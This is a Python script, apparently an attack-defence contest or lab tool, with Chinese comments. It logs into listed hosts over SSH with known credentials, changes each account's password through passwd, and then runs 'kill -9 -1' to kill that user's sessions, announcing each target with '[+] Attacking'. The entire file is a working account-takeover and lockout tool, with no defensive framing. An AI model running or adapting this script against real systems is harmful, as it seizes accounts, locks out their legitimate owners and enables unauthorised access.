# -*- coding:utf-8 -*-
import paramiko
import threading
### 格式：ip 端口 用户名 密码 ###
###   空格分隔，每行一条数据  ###
users='''
192.168.137.132 22 asd asd
192.168.137.129 22 asd asd

'''
def Async(f):
	def wrapper(*args, **kwargs):
		thr = threading.Thread(target=f, args=args, kwargs=kwargs)
		thr.start()

	return wrapper
# ssh 用户名 密码 登陆
@Async
def ssh_base_pwd(ip, port, username, password, new_password):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=password)
    stdin, stdout, stderr = ssh.exec_command("passwd {}".format(username)) #chpasswd是root的命令普通用户不能执行所以用passwd+用户名改密码
    stdin.write(password + '\n' + new_password + '\n' + new_password + '\n')  #\n模拟回车 password是输入当前密码 new_password输入新密码和确认密码
    result = stdout.read()
    if not result:
        print("无结果!")
        result = stderr.read()
    else:
	    print(result.decode())
	    ssh.exec_command("kill -9 -1") #改完密码，将所有当前用户踢下线
    ssh.close()
    return True

new_password = 'abc123456'  #密码不要太简单，防止ssh策略直接不让改
lines=users.split('\n')
for line in lines:
	if(line != ''):
		ip,port,username,password=line.split(' ')
		print("[+] Attacking " + ip)
		ssh_base_pwd(ip, port, username, password,new_password)
